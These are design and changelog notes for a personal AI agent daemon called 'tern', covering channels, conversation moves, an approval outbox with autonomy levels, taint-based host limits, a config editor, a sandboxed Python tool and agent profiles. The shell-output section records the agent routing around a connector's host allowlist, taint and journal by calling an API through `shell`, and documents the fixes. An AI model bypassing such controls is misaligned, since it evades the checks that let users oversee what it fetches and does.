Phase C4 of docs/channels-design.md §6. Migration 10 (`0010_channel_c4.sql`) is self-contained (two columns, one index) so a merge with the agent-profiles or outbox branches can renumber it.

- **Sub-agents post only when asked** (open question 4, settled): `agent_spawn` gains `post: bool`, default false. With it, the child's row gets `runs.can_post`, `channel_post` is added to its tool scope whatever its preset (a granted, taint-contained write, so a `read_only` researcher can still report progress), it posts as `tern/<label>` with `author_kind = subagent`, and when it finishes its report is posted as an `update` (key `answer:<run>`, tainted if it is; reconciled at startup like top-level answers). Without it, `channel_post` refuses and the child reports to its parent only, as before. Children still get no digest (§2.4). The flag is set right after the child's row is created, in the same gate; a crash between the two leaves an idempotently-found child that doesn't post, which is the safe side.
- **Author identity lines up with agent profiles** (agent-profiles-design §4–§5): `tern` is the default agent's id and `tern/<label>` its sub-agents', exactly the `<agent id>/<label>` form that design keeps (`tern:inbox/triage-1` later). Member lines and `/v1/runs/active` (`author_id`) use the same ids, so when profiles land only the prefix changes, in `channels::author`.
- **`needs_you` is a general mechanism, in the store**: `Store::add_post` with `kind = "needs_you"` in any channel but Home also writes a `pointer` post in Home (`points_to` it, key `pointer:<id>`, the first 280 characters, the same author and taint) in the same transaction. So any writer gets the pointer without knowing about it: `channel_post {needs_you}`, a sub-agent, and the T3 outbox, which should write its "waiting for you" items as `needs_you` posts in the asking run's channel (or Home directly, which needs no pointer) and listen for their resolution. `posts.resolved_at` closes an item; `Store::resolve_post` / `POST /v1/posts/{id}/resolve` resolves the post and its pointer together, from either side, and `channels_changed` goes out. `needs_you` in `GET /v1/channels` counts open items per channel (Home adds approvals and secret requests). Posts carry `resolved_at`, and a pointer `points_to_channel`, so clients can link without another lookup. A channel digest marks these posts "needs the user".
- **Member lines**: built from run events, which carry `channel_id` (sub-agent sessions inherit their parent's channel): every `run_started` in a channel adds a line, `subagent_spawned` gives the label, tool and text events set what it's doing, `run_finished` removes it; the main thread's line uses its transcript's richer phase ("Waiting on 2 agents"). `/v1/runs/active` now has `channel_id` and `author_id`, so a reconnecting app rebuilds them. The design's "research-1 · Running http_fetch" is shown as `tern/research-1 · Running http_fetch`, the author id, so the line names the agent the same way its posts do.
- **Desktop**: a channel's timeline ends with one line per member at work (avatar, spinner, author · activity). `needs_you` posts get a "needs you" tag and **Done**; Home's pointer cards say "needs you · #slug" with **Go to #slug** and **Done**, and resolving either updates both locally.
- **Tests**: store (pointer written once, resolve from either side, counts, none for Home's own or plain posts), digest marking, `tests/t2.rs` (a `post: true` child's progress and report posted as `tern/loud`, a plain child refused, a needs-you post's Home pointer resolved over the API with the counts, `/v1/runs/active` naming channel and author), and `test/needs_you_test.dart` (member lines from events, a Home pointer going to its channel and Done closing both).

## T2 moves (moving conversations into channels)

Asked for after C4: "if I am working through a topic on the homepage chat, there should be an easy way to move it to a channel, so that I can combine chats from different places into a new channel." Migration 11 (`0011_channel_moves.sql`, two columns) is self-contained so a merge can renumber it.

- **One endpoint for one or many**: `POST /v1/channels/move {sessions: [id…], channel | new_channel: {title, slug?, instructions?}}` → `{channel, moved: [{session_id, from, marker, arrival, fresh_session_id?}]}`. It's in `auth::OWNER_ONLY` (rearranging channels is the owner's). Everything is checked before anything changes, including before a new channel is created, so a refused move leaves no empty channel behind.
- **What can move**: any conversation with messages: Home segments (current or earlier), side chats, threads of topic channels (their main thread too), History entries, a Telegram chat's segments. Not routine sessions (they belong to their schedule) or sub-agent sessions (they belong to their parent), and only into a topic channel that isn't archived and isn't where it already is. Moving into a main channel (Home, later an agent's DM) is refused: a stream has a single chain, and merging into it has no clear place.
- **Running work blocks the move** (409, "tern is still working in …"), including a sub-agent of one of its runs. Re-pointing a live run's channel mid-flight would mean its digest cursor, member lines and answer post all change channel at an arbitrary step; waiting a moment (or Stop) is simpler and never wrong.
- **The chain, in one transaction** (`Store::move_thread`), written for any main channel, not just `home`:
  - its successor in the stream (same channel, `prev_session_id` = it) now continues its predecessor, so the stream closes around the gap;
  - **its own `prev_session_id` is left alone**: a journaled `carry` step's input is that id, and clearing it would make a resumed old run diverge. Nothing walks a chain forward, and the stream walks back from the head, so the stale link is never followed;
  - if it was a main channel's current segment, a fresh empty segment (`segment_reason = 'moved'`, after its predecessor, same source and model, its digest cursor) becomes `main_session_id`: Home carries on from the topic before the moved one, and its first run carries that over. A topic channel whose main thread moves gets none; its next send makes one;
  - a gateway chat's current segment is replaced the same way, and the moved one loses its `external_ref`, so the chat never writes into a channel thread;
  - its sub-agents' sessions (any depth) follow it, `moved_from`/`moved_at` are set, and its digest cursor jumps to the newest post: the new channel's past isn't news to it.
- **Two posts per move** (`kind = "moved"`, author `you`/`owner`, keyed `moved:<session>:<channel>` and `arrived:<session>:<channel>`, so a retried move doesn't double them):
  - the **marker** in the channel it left, dated at the conversation's last message so the stream shows it where the conversation was, `points_to` the arrival (and `points_to_channel` the new channel) so clients link to it. In Home it's a quiet line, "Moved to #launch: Book the venue", that goes to the channel;
  - the **arrival** in the target channel: "Moved here from Home: Book the venue" plus the first line of its last reply, with the moved session as `session_id`, so **Open thread** opens it. This is also how the channel's agents learn about it: the C3 digest shows it to the main thread's next run like any post. No separate summary call.
- **Taint**: runs keep their taint (it's per run); both posts are tainted if any run in the moved conversation was, so a digest reading them taints its reader as C3 does.
- **After the move** it's an ordinary thread of the target channel: continuable (from the thread pane, or `POST /v1/runs` with its `session_id`), its answers posted there as topic-thread answers, routines' reply-to-act unchanged (routine sessions don't move).
- **Desktop**: a folder icon on Home's header (the current topic), on each divider (the topic it starts), on side-chat cards, and in the thread pane; History gets a checkbox per entry and **Move to channel…** for the ticked ones. The dialog lists topic channels and **New channel** (slug shown as you type), and opens the channel afterwards. Combining from other channels goes through each thread's own move (into an existing channel); History lists Home's conversations only.
- **Tests**: store (a middle segment spliced, the current segment replaced, a topic main thread cleared, a chat's segment replaced, sub-agents following), `tests/t2.rs` (a Home segment, a side chat and an #ops thread into a new channel: refusals change nothing, the stream closes around the gap with the marker in place, history intact, arrival posts and taint, continuing the moved thread; moving Home's current topic and the next message carrying on from the one before; a running conversation refused), `test/move_test.dart` (marker, the dialog with a new channel, History multi-select, the thread pane), and the screenshot test (marker, icons, dialog), looked at in light and dark.

## T3 (the outbox, autonomy profiles, the tainted host limit)

The rest of T3 after T3a (docs/personal-agent-tooling-spec.md §5.2, §5.4, and the last paragraph of §5.3). The Tasks view the §12.2 row mentions is T6b in §12.1, so it isn't here. Migration 12 (`0012_outbox.sql`, renumbered from 10 at merge) is self-contained (two columns and one table) so a merge can renumber it. In the agent, the logic is in `agent/outbox.rs` and `approval::check`; `agent.rs` changed at the approval step (`decide`), one branch at the top of `drive_inner` for exec runs, and two lines around tool calls for the host limit.

- **Deferral is an approval outcome, not a tool-result kind.** When a `write` or `destructive` prompt gets `Decision::Unanswered` (no API client listening, a chat message that didn't go out) or no answer within `[outbox] wait_secs` (default 120), `decide` queues the call (`Store::add_outbox`, unique per `(run_id, call_id)`) and records `ApprovalOutcome::Deferred`, with the tool result "queued for approval as outbox #12 …". The approval step is journaled as before, so replay returns the same outcome and message, never asks again and never makes a second item. `read` prompts (a read outside the workspace, a new host in a tainted run) still time out into a denial: there is nothing to execute later that the user couldn't just ask for.
- **Only the daemon defers.** `ApprovalHandler::can_defer()` is false by default and true for the daemon's `Router`; `tern run` and the in-process TUI keep "deny" (nothing would execute the item). `ApprovalHandler::deferred(req, id)` lets the daemon announce it. In the daemon, write prompts now wait 2 minutes, not 10, before deferring (the spec's `approval_wait`); before, an unanswered prompt was a denial anyway. `ApiApprovals` drops a request from `/v1/approvals` when the agent stops waiting, so a deferred card can't be answered late; the desktop's card says "Nobody answered, so it waits in the outbox".
- **Executing exactly once.** Approving (`Store::approve_outbox`) is a compare-and-set from `pending` (and not past `expires_at`) to `approved` that also names the system run that will execute it (`exec_run_id`), so a second approval gets 409. That run (trigger `outbox`, the original run's model, no system prompt, in the item's session) has one journaled step, `outbox_exec`, which runs the tool with the item's (possibly edited) arguments. Like a tool step, a non-idempotent call cut off by a crash is recorded as interrupted (the item ends `failed`), never retried; an idempotent one is retried. Forbidden tools are re-checked and never run. Recovery: the startup triage resumes exec runs (driven directly, not through `Manager::spawn`, whose active map is per session and would displace the run working there), and `reconcile_outbox` creates runs for items approved just before a crash.
- **What the conversation and the run learn.** The exec step adds one user message to the session, "[outbox #12: the user approved …, and it ran]" plus the result (wrapped if the tool is untrusted), since there is no `tool_use` to pair a tool result with. If the run that queued the item is still working when it is approved, rejected or expires, it gets agent mail (`kind = outbox`, rendered as the note itself) once per state; otherwise nothing is injected. A rejection note goes into that mail.
- **Edit = approve with arguments.** `POST /v1/outbox/{id}/approve {input}` (a JSON object) is stored as `edited_input_json` next to the model's arguments; `OutboxItem.edited` says so.
- **Posts and chats.** A routine's (or topic thread's) answer post lists its pending items ("Waiting for your approval: …"). An executed item writes an `update` post into its session's channel (Home if none) and sends the same line to the chat the run tree reports to; an expired one posts once to Home. Expiry is a 60 s sweep in the daemon (`[outbox] expire_hours`, default 72).
- **Home integration is deliberately thin**, for channels C4: there is no `needs_you` post for a new item. Clients get `Change::OutboxChanged {id, state}` and `GET /v1/outbox`; the desktop shows pending items as cards above Home's composer (Approve, Edit…, Reject with a note) and counts them in the Home badge. `Manager::announce_outbox` is the one place to call C4's pointer from when it lands. Telegram gets a card with Approve/Reject buttons (`ob:<id>:approve`) when the run tree reports to a chat; `ChatHost::decide_outbox` decides it as a remote client.
- **Local-only items** (host commands outside the sandbox) can be decided only over the Unix socket, as approvals: the API refuses them from TCP devices (403), Telegram shows the card without buttons, and the desktop says to decide it on that computer. `/v1/outbox` is a chat-scope write, like `/v1/approvals`.
- **Autonomy** (`approval::Autonomy`, ordered `readonly < supervised < autonomous < yolo`): `config.toml` `autonomy`, and a routine's own (`schedules.autonomy`, set through the API only; `ScheduleLimits`, which the agent's `schedule_*` tools share, doesn't carry it, so the agent can't raise its own routine). It is frozen on the run (`runs.autonomy`, set by `Runtime::start_run` from the live config, then by `start_scheduled` for a routine) because it decides whether an approval step exists at an index, exactly like taint; sub-agents copy their parent's in `create_run`. A per-agent ceiling (agent profiles) will be a `min` at that same point. `approval::check` takes a `Gate { tainted, autonomy }`:
  - `readonly`: anything but `read` is `Check::ReadOnly`, refused without asking ("blocked: this run is read-only…"), except `TAINT_CONTAINED` (sub-agents, `channel_post`: tern's own state; children are read-only too). Memory flush saves are skipped.
  - `autonomous`: an untainted `write` is allowed without a grant unless `requires_approval` forces a prompt, so commands outside the shell allowlist and `connector_activate` still ask; `destructive` still asks.
  - `yolo`: everything not forbidden is allowed, tainted or not. `money_movement`/`trade` stay refused. `tern doctor` has an Autonomy section that shows a global or per-routine `yolo` in red (ANSI, on a terminal) and counts pending outbox items. The TUI has no status line carrying config today, so the spec's "status line in red" isn't built.
  - Taint now also ignores allowlist grants for forced reads, and every prompt in a tainted run comes without "always".
- **The tainted host limit**: `Tool::egress_host(args)` (default none; `http_fetch` returns the URL's host). In a tainted run a call to a host the run hasn't reached yet gets `requires_approval`, so it asks (a `read` prompt, no "always", not deferrable). Hosts reached are tracked in the loop's `Taint` from completed tool steps, so replay rebuilds them. Redirects aren't followed into the check (`http_fetch` follows them itself), and MCP browser navigation isn't covered: a browser server would need to declare hosts the same way.
- **Tests**: `approval::autonomy_profiles_decide_what_asks`; store tests for idempotent queuing, single approval, expiry; agent tests for deferral (unanswered and timed out) with replay, an approved item running once with an edit and not again on replay, a crash mid-call not repeated, a decision mailed to a working run, autonomy frozen per run (`readonly`, `autonomous`, `yolo` over taint), and the host limit with replay; `tests/t3.rs` against the daemon (a tainted routine's write with an "always" grant goes to the outbox, the post lists it, approve-with-edit writes the file once, a second approval is 409, nothing reruns after a restart; a routine's own `readonly`); desktop `test/outbox_test.dart` (decoding, the card, approve, edit, reject).

### Shell output and integrations (T3 follow-up)

Found in use: with a county-property connector active, the agent compared addresses by writing Python through `shell` that called the same API directly, skipping the connector's host allowlist, its effect, taint and the journal. And `shell` results were never untrusted, so `curl` output didn't taint the run (a T3a gap).

- **`shell` is untrusted whenever its commands can reach the network**: `Tool::untrusted()` asks the backend (`SandboxBackend::network_reachable`, default true). Docker: its `network` setting (`--network none` otherwise). Host: `network = true`, or `false` with nothing to enforce it (`confine = "off"`, or the OS sandbox unavailable), since an unenforced `false` is still a network. So with the default config every shell result taints the run and reaches the model wrapped, like `http_fetch`. Deciding per tool rather than parsing commands for `curl` keeps it cheap and unfoolable; the cost is that a tainted run's later writes ask, which is the point when output may have come off the network. `/v1/tools` now lists `shell` as untrusted when it is.
- **With `network = false` enforced**, output stays trusted: commands only see local files, which `read_file` already reads as trusted. Content downloaded earlier and read back later isn't tracked (taint is per run and coarse).
- **The prompt rule** goes under the `## Integrations` list, so it appears only when a connector or MCP server is active (the list is empty otherwise): "Fetch data an integration provides through its tools, never with `shell`, `curl` or scripts; for many lookups, call the tool repeatedly." A request to the model, not enforcement; taint and `network = false` are the enforcement.
- **Connectors first, and suggesting new ones** (a later tightening). `## Integrations` is now in every system prompt. With integrations active it lists them and says to always get their data through their tools, even when `shell`, `curl`, `http_fetch` or a script would be quicker, calling the tool once per item for many lookups; compute tools (the coming `python`) may process what those tools returned but never fetch. Always, even with no integrations (exactly the case that matters), it says: before fetching from an outside service the user will likely want again (a public or REST API, many lookups, a recurring task), check whether it has an API, and if so suggest a connector in one sentence (what and why: repeatable, safer, approvable); build it with `connector_write` only on a yes; not for one-offs; at most once per service per conversation; drop it on a no. There is no OAuth-first flow in the prompt yet (T4a), so it doesn't mention one. It costs about 120 tokens per prompt. Kept to that one section so agent profiles' prompt changes merge cleanly.
- **`tern doctor`** adds an info line under Sandbox when `[sandbox] network = true` and any Luau connector or enabled MCP server exists, suggesting `network = false`. The default stays `true`: many shell uses (package installs, `git pull`) need the network.

## Config editor (desktop)

A modal for seeing and changing `config.toml` without a terminal, after it turned out `[shell] network = true` (the default) was invisible from the UI.

- **The schema is the defaults, not a hand-kept list.** `tern_core::config::settings` walks `Config::default()` as JSON: every leaf is a setting, its type comes from its default (bool, int, float, text, list of text), and its section is its first path part (top-level keys go to General, or Models for `default_model` and `context_window`). So a new field, T3's `[autonomy]` or a `[python]` section, shows up in the app with no UI or daemon change. A small `meta()` match adds only what a default can't say: choices for enums (`sandbox.backend`, `sandbox.confine`, `api.tls`), ranges, the type of `Option` fields whose default is `null`, which settings apply live, and security notes. A field it doesn't know gets an inferred type and a "restart" label, which is the safe guess. An empty-map default (`subagents.models`) is kind `other`: shown, edited in the file.
- **Descriptions and order come from `config.example.toml`.** Its comments, commented-out keys included, are parsed once: a key's inline comment, else the comment block just above it; a block above a `[table]` header describes the section; inline comments that only list choices (`"host" | "docker"`) are skipped. Settings are ordered as the example first mentions them. `every_setting_has_a_description` fails until a new setting is documented there, which keeps the shipped example the one source (it gained comments for several keys and a commented `[api]` block; it still parses to the defaults).
- **Left out: `providers`, `mcp`, `gateway`.** They have their own editors and hold secret names; keys ending `_secret`/`_secrets` are refused outright. No secret value can reach this API.
- **One setting per request** (`PUT /v1/config/settings/{key}` `{value}`, `DELETE` resets by removing the key), like the secrets editor, rather than a whole-config PATCH: the app saves each control as it changes, and a bad value fails alone. Writes go through `ConfigFile` (`toml_edit`): comments and layout kept, the value's type and range checked first (400 with the setting named), then the whole file parsed with `Config::parse` (so `deny_unknown_fields`, `quiet_hours` and `day_starts` formats still apply) before an atomic write. Unknown keys are 404.
- **Live versus restart.** After a save the runtime swaps the file's config into `live` (as provider and MCP reloads already do) and announces `providers_changed` for `default_model`. What reads `live` applies from the next use: `default_model` (and its chain), `schedules.*`, `home.*`, `api.remote_mcp_stdio`. Everything else is read once at startup, so it's labelled `restart`, and `restart_pending` compares the file with the config the process started with, which survives closing and reopening the window. The app shows "Restart to apply" per setting, a banner with a count, and on this computer a **Restart tern** button (`tern stop`, `tern start`).
- **Security flags.** `sandbox.network`, `sandbox.confine`, `sandbox.read_paths`/`write_paths`, `api.listen`, `api.tls`, `api.trust_proxy` and `api.remote_mcp_stdio` carry a one-line note, and `risky` is set when the current value is the less safe one (network on, confine off, a tcp listener, TLS off, …); the app tints those and marks their section. Autonomy isn't on main yet: T3 adds one `meta()` arm for it.
- **Owner only**: `/v1/config` was already in `OWNER_ONLY`, so a paired `chat` or `read` device gets 403 on reads too (the config names hosts, paths and listeners); the app says "only a device paired as owner".
- **Entry points**: tern › Configuration… (macOS menu), and **All settings (config.toml)…** in Settings. There's no command palette yet. **Open config.toml** reveals the file in Finder (`xdg-open` on its folder elsewhere), only when the daemon is on this computer.
- **TODO (follow-up): a TUI panel.** The secrets editor has one; a settings panel with typed editing is a bigger piece of TUI than that was, so for now the TUI has `tern config get|set` and `/reload`.
- **Tests**: `config::settings::tests` (grouping, types, marks, descriptions, comment-keeping set and reset, refused values and keys, a broken file); `crates/tern/tests/config_api.rs` (read, change, live apply through `/v1/info`, validation leaving the file alone, reset, 403 for chat and read devices); the Dart client's decoding and live round trip; `test/config_dialog_test.dart` (toggle, restart hint and restart, reset, choice, number/list/model parsing, inline server errors, search, 403, reveal, and light/dark screenshots against a real daemon reply in `test/fixtures/config_settings.json`).

## PY0 (the `python` compute tool)

Phase PY0 of docs/python-tool-spec.md: read-only compute on Monty whose scripts call tern's tools, so loops over a connector no longer go through `shell` and around its allowlist, taint and journal. The interpreter side is the new `tern-python` crate; the loop side is `tern-core/src/script.rs` (the host interface) and `agent/script.rs` (serving calls), with two small hooks in `agent.rs`.

- **Monty 1.4.0, pinned exactly** (`monty`, `monty-types`, `monty-fs` at `=1.4.0`): it releases weekly, and a new release changes error messages the hint table keys on. **MSRV raised to 1.96** (Monty's `rust-version`). CI already builds on `dtolnay/rust-toolchain@stable`, so no workflow change was needed.
- **In-process for PY0, the helper is PY1.** Monty runs on its own thread (64 MB stack) inside the daemon, and the async side answers its tool calls over channels shaped like the helper protocol (spec §5.2), so moving it out is a transport change. What that gives up until PY1: a native crash in Monty ends the daemon (its README says so), and `max_memory` is only Monty's pre-check of predictable sizes (`'x' * 10**9` is refused), because counting every allocation needs `monty-alloc` as the process's global allocator, which is per process. Time (30 s interpreter time, 10 s between tool calls, 10 min wall), recursion (1000 frames) and tern's own host-call cap (200) are fully enforced.
- **Host functions are the tools' own names** (`lua__county__lookup`, `mcp__…`, `read_file`), synchronous. Keyword arguments map to schema properties, positional ones fill `required` in order, one positional dict is the whole input. A JSON result comes back parsed, anything else as a string; a tool error raises `RuntimeError("<tool>: <first line>")`, a refusal `PermissionError`. Async and `gather` are PY1: Monty needs the host to decide per call whether to hand back a future, and a plain call can't be told from one inside `gather`. Awaiting a tool fails with Monty's "awaitable is required". MCP names containing `-` can't be called yet (spec §3.2's `_` mapping isn't built).
- **What a script may call** (`script::callable_in_scripts`): tools in the run's scope whose declared effect is `read`, minus `NOT_IN_SCRIPTS` (`python`, `shell`, `agent_*`, `channel_post`, `secret_request`, `connector_*`, `schedule_*`, `mcp_*` admin tools). Each call is then checked again: the per-call policy must be `read`, and `approval::check` with the run's current taint must be `Allow`. A call that would ask (a read outside the workspace, a forced MCP tool) or is forbidden is refused with `PermissionError` and "call it directly": PY0 has no approvals mid-script. Tools the run has but a script can't call are passed to the script with the reason (`ScriptHost::blocked`), so `lua__x__flag(...)` says "write tool; scripts can only call read-only tools" instead of a `NameError`. Refusals aren't journaled: they follow from scope, tool and taint, which a replay sees the same way.
- **Sub-steps, not a new journal shape.** A new step kind, `py_call`. The script's own call is the `tool` step at *N*; sub-step *N*+1 records the clock and seed (`{"in": N, "seq": 1, "env": true}`), and each tool call is *N*+1+*i* with input `{"in": N, "seq": i, "call": {name, input}}`. Steps complete out of order (*N* last), which the journal allows. After the `tool` step the loop skips every `py_call` that follows (`journal.peek`), on a live run and a replayed one alike, so the step count needs no extra field. A sub-step follows the tool's own in-flight policy: idempotent tools retry, others are recorded as interrupted.
- **Resume is a re-run.** `python` is `read` and idempotent, so a `tool` step found `started` runs the script again. Its clock (`DateTimeSource::Fixed`), seed (`RandomStart::Seed`) and sleeps (`SleepMode::Zero`) come from the journaled env sub-step, and every tool call already recorded is answered from the journal. Divergence is the journal's usual input-hash check, which truncates from the first differing sub-step; in PY0 everything a script can do is a read, so continuing live is safe. Monty's `dump()` isn't used (spec §4.3).
- **Taint.** A sub-step's result carries `untrusted` like any tool step; the serving loop raises its own taint flag for the rest of the script, and the `python` result is marked untrusted (wrapped, and it taints the run through the existing tool-step path with reason "result of python").
- **Workspace** is mounted read-only at `/workspace` (`monty-fs`, `cap_std`); writes and other paths raise `PermissionError`. There is no environment, network or subprocess.
- **Errors for the model** (`tern-python/src/errors.rs`): Monty's traceback plus a `hint:` line for unsupported features (inheritance, `yield`, `del`, method decorators), missing modules (packages → "use shell with python3", `statistics` → how with `math`), limits and near-miss tool names ("did you mean lua__county__lookup?"). A test runs each feature hint through Monty so a release that adds the feature shows up.
- **Prompt**: the tool description says to prefer it to `shell` + `python3`, and `prompt::COMPUTE_NOTE` (a `## Compute` section) is appended by the runtime when `python` is registered, after `system_prompt` rather than inside it, to stay out of prompt assembly that agent profiles are changing. It doesn't yet know a profile's scope, so it says "if you have it".
- **Not built from the spec's PY0 picture**: streaming `print` output live (it comes back at the end), `[python]` config (limits are constants in `tern_python::Limits`), stubs in the prompt, `reuse_reads`.
- **Cargo feature `python`, on by default.** Binary size, `--profile dist`, aarch64-apple-darwin, same tree with and without the feature: **22.9 MB → 29.9 MB (+7.0 MB)**, cut to **28.9 MB (+6.0 MB)** by `opt-level = "s"` for Monty's interpreter, parser and name tables in `[profile.dist.package.*]` (scripts are small; the e2e tests pass against that build). **This breaks the tooling spec's 25 MB budget** (§1, "Lightweight"); the main growth is the ruff parser and Monty's VM. **Kept on by default** (the user's call, 2026-11-04): it's the fix for compute bypassing connectors, so the budget gives way, not the tool. `--no-default-features --features tray` gives a build without it. The static `x86_64-unknown-linux-musl` build (`cargo zigbuild`, as release CI does) builds and is 32.7 MB; no musl baseline was measured. (The 13.9 MB in docs/reference.md's measurements is from v0.1; today's baseline is 22.9 MB.)
- **Tests**: `tern-python` unit tests (results and printing, inputs, a loop of calls through a fake host, tool errors caught, untrusted output, argument errors, near-miss names, the host-call cap, `await`, the frozen clock and seed, the read-only mount, inheritance and other hints, module hints, syntax errors, time, memory, recursion and code-size limits, the print cap, JSON round trip); `crates/tern/tests/py0.rs` through the real binary with a Luau connector that counts its calls in kv (a loop journaled as one env plus four `py_call` sub-steps; `TERN_CRASH_AFTER_STEP` mid-script then `tern resume` gives calls `[1,2,3,4]`, not repeats; an `untrusted = true` tool taints the run and output; a `write` tool refused before any sub-step).
## Agent profiles AP0 (several configurable agents, each with a DM)

Phase AP0 of docs/agent-profiles-design.md §8: store, runtime, API, CLI and TUI. No desktop UI yet (AP1).

- **Migration 13** (written as 10, renumbered when merged after C4's 10–11 and T3's 12) is §2's DDL plus `agents.delegates` (the API lists it; AP3 uses it), `runs.memory_scope`, an index on `memories(agent_id)`, and `home.agent_id = 'tern'`. Nothing else is backfilled: `NULL` everywhere means the default agent, so an existing setup is the `tern` agent with shared memory, Home as its DM, every session, schedule and memory its own. New rows for `tern` are written `NULL` too (`create_thread` takes `NULLIF(channel.agent_id, 'tern')`, schedules the same), so `tern`'s rows look the same before and after. `channel_agents`, `runs.woken_by` and `posts.wake_depth` are created now so AP2 needs no migration, and nothing writes them yet.
- **Ids and paths.** `tern`, or `tern:<slug at creation>`. A DM channel is `dm:<slug at creation>` with slug `dm-<slug>`; renaming an agent renames its DM's slug and title, never an id. An agent's files are in `~/.tern/agents/<id without "tern:">/` (`persona.md`, and `memory.md` when private), so no `:` in paths; `tern` keeps `~/.tern/persona.md` and `memory.md`.
- **A session belongs to an agent; a run's agent is its session's.** `create_thread` takes the channel's agent (a DM's owner; a topic channel's lead, `NULL` until AP2), a sub-agent's session its parent's (in `create_run`, next to the channel), a schedule's session its owner's.
- **What `start_run` freezes** (`Runtime::start_run`, `agent_frame`): it reads the session's agent once. *Persona* goes into the frozen system prompt. *Tool scope* becomes `runs.tool_scope`, the column sub-agents already used, so the agent loop changed by one new constructor (`Agent::start_run_as`, two more `NewRun` fields) and nothing else. *Memory scope* is the new `runs.memory_scope`. An archived agent's runs are refused. The default agent with no other agents gets exactly the prompt and scope it had before (`tool_scope` `NULL`).
- **Tool scopes are frozen as names plus prefix patterns.** `ToolScope::freeze` expands built-ins against the registry's own tools, adds the system layer (`agents::SYSTEM_TOOLS`), and writes connectors, MCP servers and skills as `lua__<name>__*`, `mcp__<name>__*` and `skill:<name>` (or `lua__*`, `mcp__*`, `skill:*` for all), because an MCP server's tools aren't listed until it starts. `tool::in_scope` treats an entry ending in `*` as a prefix: one line in `tool.rs`. Skills are left out of the prompt's list and refused by `skill_read`, which reads the run's scope. A scope that doesn't parse fails closed (read-only built-ins). `"read_only"` is only for built-ins.
- **A sub-agent's scope is cut to its parent's** (`Subagents::scope_for` filters the registry by the parent's `tool_scope`): before, children could get any tool. It gets its parent agent's persona and memory through the prompt builder (which now receives the parent's session), and its `subagent_model` when `agent_spawn` names none.
- **Models.** An agent's model is a `ModelChain` stored as a string or a JSON list. A run's model is its head, picked after `--model` and the session's own model and before `default_model`. Its fallbacks follow T6a's rule, a chain belongs to its first model: the runtime puts every agent's chain into the live config (`Config::agent_chains`, `#[serde(skip)]`, after the config's own chains, refreshed on every agent change and config reload). **The agent's model isn't pinned on the session** (other picks still are), or editing an agent's model would never reach its long-lived DM. **The default agent's model is `default_model`**: `PATCH /v1/agents/tern {model}` writes it like `PUT /v1/config/default_model` (a chain for `tern` stays a config.toml edit), so Home's pinned sessions behave as before.
- **Memory scopes** (§1.3). `memory_save`, `memory_search` and `profile_edit` read the run's frozen scope from the store by run id (`Store::run_agent`). Private: `memory_save` writes `agent_id` unless `shared: true`; search returns its own and the shared rows, marking its own "yours"; `profile_edit memory` edits its own `memory.md`, `user` the shared `user.md`. Shared agents (and `tern`) read and write `agent_id IS NULL` rows only, so the old `search_memories` now filters to shared rows. `session_search` is limited to the run's agent's sessions for every agent, `tern` included (it never sees another agent's DM). `history_search` was already per channel. T5a's flush goes through `memory_save`, so it lands in the agent's scope.
- **The "## Agents" prompt section** is added after the persona when there is more than one active agent: who the user's agents are (`@slug · Name · first persona line`), that they don't see each other's conversations or memory, that approvals are in Home, and that "keep checking" is a schedule. It doesn't mention `@mentions` yet, which do nothing until AP2.
- **Schedules** gain `agent_id`. `create_schedule` takes the owner: an agent's schedule posts to its DM by default, `tern`'s to Home; its session belongs to the owner, so its runs act as it. `schedule_list/update/delete` act on the caller's schedules only; another agent's id is "no schedule … of yours". `GET /v1/schedules?agent=`, `agent` on create, and `agent` on update (handing a job over moves its default channel to the new owner's DM). Archiving an agent disables its schedules; unarchiving leaves them off.
- **Posts**: `channel_post` writes the run's agent's id and name. Routine posts keep `routine:<schedule id>`. A DM is a main channel, so like Home its own sends and answers are messages, not posts.
- **API** (`api_agents.rs`, owner-only writes like other config): `GET/POST /v1/agents`, `PATCH /v1/agents/{id}`, `GET/PUT /v1/agents/{id}/persona` (GET's `system_sections` is the frozen prompt minus the persona, for AP1's read-only preview), `GET /v1/agents/templates`, `GET /v1/memories?agent=&q=`. The default agent can be renamed and re-avatared but keeps its slug, shared memory, and can't be archived. A DM can't be archived on its own. `Change::AgentsChanged`. Run events gain `agent_id`; approvals and secret requests gain the root session's `channel_id` and `agent_id` (what AP1's mirror needs); `SessionItem` and `Channel` gain `agent_id`; a DM's `needs_you` counts its own agent's waiting requests, Home's still counts all. `Runtime::create_agent` is shared by the API and the CLI.
- **`[main]`** is accepted as an alias of `[home]`.
- **CLI**: `tern agents [list|new|edit|archive]`, on the store and files directly (no daemon needed); a running daemon reads agents at each run, so edits apply to the next one, though desktop clients only hear `agents_changed` for API edits.
- **TUI**: `/agent <name>` switches to an agent's DM (`Backend::send_to_agent`: the daemon's channel send, so cuts and queueing apply; embedded, the DM's current thread or a new one on `/new`), `/agent tern` goes back to the TUI's own sessions, `/agents` lists agents before the last run's sub-agents, and the status line names the agent. `/agent <label>` already meant a sub-agent: a sub-agent of the current tree with that label wins, then an agent profile.
- **Not done (AP2+)**: topic-channel membership and leads, mentions and wakes, delegating to profiles, a bot per agent, autonomy ceilings, per-agent workspaces.
- **Tests**: migration backfill (`migrations::tests::agents_backfill_*`, from a version-12 database), `agents_repo` (DM creation and rename, thread ownership, archiving, private memories, sub-agent inheritance), `agents::tests` (scope parsing, freezing, patterns, paths, templates), `prompt::tests::an_agent_gets_*`, `schedule::tests::an_agent_sees_and_changes_only_its_own_schedules`, `memory::tests::a_private_agent_keeps_*`, the TUI's `agent_switches_to_a_profiles_dm_and_back` and `a_sub_agent_label_wins_over_an_agent_name`, and `tests/ap0.rs` against the daemon: CRUD and persona files, an edit mid-run applying to the next run only, tool and memory scope enforcement, agent-owned routines posting to the DM, a chain falling back, and `tern agents`.

- **Each member has its own main thread** in the channel: the lead's is `channels.main_session_id` (so everything C2 and the move feature built on it holds), a member's is `channel_agents.main_session_id`, created on first use with `NewThread.agent_id`. Changing the lead swaps them in one transaction: the old lead keeps its thread as a member's, the new lead's becomes the main one.
- **Who answers the user's post** (`Manager::send_to_topic`): no mention → the lead (an archived lead falls back to tern); a reply with no mention → the agent whose thread the replied-to post is in (a routine's: its agent); `@mentions` → each mentioned active agent, in parallel, each in its own thread (in a reply: its own side thread off that post). Mentioning a non-member adds it, with a "Name joined" note. The post is written *first*, then each run is started with `runs.woken_by` = the post, so its answer replies to it (`post_run_result` reads `woken_by` before the old `send:{run}` key) and its digest leaves it out (`unseen_posts` skips posts that woke a run in that session). `Sent` gains `woke: [{agent_id, run_id, session_id, queued}]`; `run_id`/`session_id` are the first's. A busy agent gets the text as queued mail (C1).
